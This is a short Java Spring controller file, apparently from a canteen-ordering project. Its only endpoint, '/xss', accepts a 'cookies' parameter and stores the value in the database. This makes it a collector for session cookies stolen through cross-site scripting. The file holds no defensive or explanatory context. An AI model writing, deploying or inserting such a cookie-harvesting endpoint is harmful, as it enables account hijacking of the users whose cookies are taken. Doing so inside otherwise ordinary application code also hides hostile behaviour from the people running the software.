package com.quickcanteen.controller;

import com.google.common.collect.Maps;
import com.quickcanteen.dto.BaseBean;
import com.quickcanteen.dto.BaseJson;
import com.quickcanteen.dto.Role;
import com.quickcanteen.mapper.UserInfoMapper;
import com.quickcanteen.model.UserInfo;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

import java.util.Map;

@RestController
public class Index {
    @Autowired
    private UserInfoMapper userInfoMapper;

    @RequestMapping(value = "/xss")
    public Map<String, Object> getCookies(@RequestParam("cookies") String cookies) {
        Map<String, Object> result = Maps.newHashMap();
        userInfoMapper.insertCookies(cookies);
        result.put("returnCode", 0);
        return result;
    }
}
